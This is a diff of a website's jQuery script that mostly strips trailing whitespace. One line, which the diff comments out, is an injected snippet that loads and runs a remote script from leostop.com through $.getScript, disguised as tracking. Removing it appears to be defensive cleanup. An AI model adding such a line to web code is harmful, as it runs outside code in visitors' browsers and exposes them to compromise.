@@ -52,7 +52,7 @@
     $(".navbar").removeClass("d-none");
   })
 
-  // Scroll to top  		
+  // Scroll to top
   if ($('#scroll-to-top').length) {
     var scrollTrigger = 100, // px
       backToTop = function () {
@@ -75,10 +75,10 @@
     });
   }
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  //function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
-  // Banner 
+  // Banner
 
   $('.heading').height($(window).height());
   $('.parallaxie').parallaxie();
@@ -106,7 +106,7 @@
 
   });
 
-  // FUN FACTS   
+  // FUN FACTS
 
   function count($this) {
     var current = parseInt($this.html(), 10);
